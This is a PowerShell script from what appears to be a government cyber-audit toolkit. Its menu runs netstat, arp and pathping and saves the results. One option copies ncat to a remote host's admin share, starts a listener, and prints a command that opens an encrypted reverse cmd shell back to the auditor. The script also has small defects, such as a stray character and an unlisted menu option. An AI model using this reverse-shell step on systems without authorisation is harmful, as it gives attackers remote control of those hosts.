<#	
	.NOTES
	===========================================================================
	 Created on:   	2/24/2020 1:11 PM
	 Created by:   	Omerf
	 Organization: 	Israel Cyber Directorate
	 Filename:     	CyberNmap
	===========================================================================
	.DESCRIPTION
		Cyber Audit Tool - Namp scripts
#>

. $PSScriptRoot\CyberFunctions.psm1
ShowIncd
CyberBginfo
$runningScriptName = $MyInvocation.MyCommand.Name
$Host.UI.RawUI.WindowTitle = "Cyber Audit Tool 2021 [$runningScriptName]"

#Set the credentials for this Audit (it will be stored in a file)
#Get-Credential $env:userdomain\$env:USERNAME | Export-Clixml -Path $PSScriptRoot\Tools\credentials.xml
#$cred = Import-Clixml -Path $PSScriptRoot\Tools\credentials.xml

start-Transcript -path $AcqBaseFolder\CyberAttackPhase.Log -Force -append

cls

do {
#Create the main menu
Write-Host ""
Write-Host "************************************************************************               " -ForegroundColor White
Write-Host "*** Cyber Audit Tool (Powershell Edition) - ISRAEL CYBER DIRECTORATE ***               " -ForegroundColor White
Write-Host "************************************************************************               " -ForegroundColor White
Write-Host ""
Write-Host "     Nmap Scripts:                                                                     " -ForegroundColor White
Write-Host ""
Write-Host "     1. Netstat      		| Displays netstat FQDN network connections                " -ForegroundColor White
Write-Host "     2. arp         		| Contains the results of recent ARP querie                " -ForegroundColor White
Write-Host "     3. pathping       		| combines the best aspects of Tracert and Ping            " -ForegroundColor White
Write-Host ""
Write-Host "    99. Quit                                                                           " -ForegroundColor White
Write-Host ""
$input=Read-Host "Select Script Number"

switch ($input) 
     { 

    #Netstat
    1 {
       $help = @"

        Netstat
        -------
        
        Displays protocol statistics and current TCP/IP network connections:
        -f Displays Fully Qualified Domain Names (FQDN) for foreign addresses
        -r Displays the routing table

"@
        Write-Host $help
        $ACQ = ACQ("netstat")
        Invoke-Expression "netstat -f" | Set-Content -Path $ACQ\netstat-f.txt
        Invoke-Expression "netstat -r" | Set-Content -Path $ACQ\netstat-r.txt
        read-host “Press ENTER to continue”
        $null = start-Process -PassThru explorer $ACQ
        }

    #arp
    2 {
       $help = @"

        arp
        ---
        Windows devices maintain an ARP cache, which contains the results of recent ARP queries. 
        You can see the contents of this cache by using the ARP -A command. 
        If you are having problems communicating with one specific host, you can append the 
        remote host’s IP address to the ARP -A command.

"@
        Write-Host $help
        $ACQ = ACQ("arp")
        Invoke-Expression "arp -a" | Set-Content -Path $ACQ\arp-a.txt
        read-host “Press ENTER to continue”
        $null = start-Process -PassThru explorer $ACQ
        }

    #PathPing
    3 {
       $help = @"

        PathPing
        --------
        
        Entering the PathPing command followed by a host name initiates what looks
        like a somewhat standard Tracert process.
        Once this process completes however, the tool takes 300 seconds (five minutes) to gather statistics,
        and then reports latency and packet loss statistics that are more detailed than those provided by
        Ping or Tracert.

"@
        Write-Host $help
        $ACQ = ACQ("PathPing")
        $input = Write-Host "Input ip address or name of server"
        Invoke-Expression "pathping $input" | Set-Content -Path $ACQ\PathPing-$input.txt
        read-host “Press ENTER to continue”
        $null = start-Process -PassThru explorer $ACQ
        }x`
      #Ncat
    4 {
       $ncatPath = scoop prefix ncat
       $help = @"

        Ncat (netcat)
        -------------
        
        https://nmap.org/ncat/

        networking utility which reads and writes data across networks from the command line,
        and is integrated with Nmap.

        This script will help you to open an Encrypted reverse cmd shell from a remote computer
        to the local computer.
        
        Tutorials
        ---------
        https://www.hackingtutorials.org/networking/hacking-with-netcat-part-1-the-basics/

        Note: You can copy ncat from: $ncat
"@
        Write-Host $help
        $ACQ = ACQ("ncat")
        $input = Read-Host "Input the destination computer name or IP address to copy ncat to (eg. DC1 or 10.1.1.22)"
        $targetIP = ((Test-Connection $input -Count 1).IPV4Address).IPAddressToString
        $localIP = activeIPaddress
        $ncatPath
        $input
        Copy-Item -Path "$ncatPath\ncat.exe" -Destination "\\$targetIP\c$\Temp"
        Write-Host "Starting ncat on local machine port 9999"
        Start-Process PowerShell -ArgumentList "ncat -vnl 9999 --allow $targetIP --ssl;read-host 'Press Enter to Exit'" -Verb RunAs
        Write-Host "Run this command on target [$input]: c:\temp\ncat.exe --exec cmd.exe -vn $localIP 9999 --ssl" 
        read-host “Press ENTER to exit”
        #$null = start-Process -PassThru explorer $ACQ
        }

    #Menu End
    }
 cls
 }
while ($input -ne '99')
stop-Transcript | out-null